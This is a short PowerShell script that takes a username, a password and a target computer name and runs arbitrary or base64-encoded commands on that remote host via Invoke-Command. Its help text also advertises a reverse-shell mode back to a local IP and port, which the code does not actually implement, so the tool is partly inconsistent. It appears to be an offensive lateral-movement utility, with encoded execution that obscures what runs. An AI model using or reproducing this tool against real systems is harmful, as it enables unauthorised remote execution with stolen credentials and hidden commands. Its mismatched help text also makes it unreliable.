
Param (
    [Alias("h")]
    [switch]
    $Help,
    [Alias("u")]
    [string]
    $Username,
    [Alias("p")]
    [string]
    $Password,
    [Alias("cn")]
    [string]
    $ComputerName,
    [Alias("c")]
    [string]
    $Command,
    [switch]
    [Alias("b")]
    $Base64
)

function Show-Help {
    Write-Host
@"
Regular Command:
    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Command <command>
    or
    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -c <command>

Base64 Command:
    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Base64 -Command <command>
    or
    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -b -c <command>

Reverse Shell (using built-in PowerShell commands)
    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -RevShell -LHOST <local ip> -LPORT <local port>
    or
    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -rs -lh <local ip> -lp <local port>
"@
}

If ($Help) {
    Show-Help
} Else {
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword
    If ($Command) {    
        If ($Base64) {
            Invoke-Command -ComputerName $ComputerName -Credential $Credential -ScriptBlock { powershell.exe -e $Using:Command }
        } Else {
            Invoke-Command -ComputerName $ComputerName -Credential $Credential -ScriptBlock { powershell.exe -c $Using:Command }
        }
    }
}

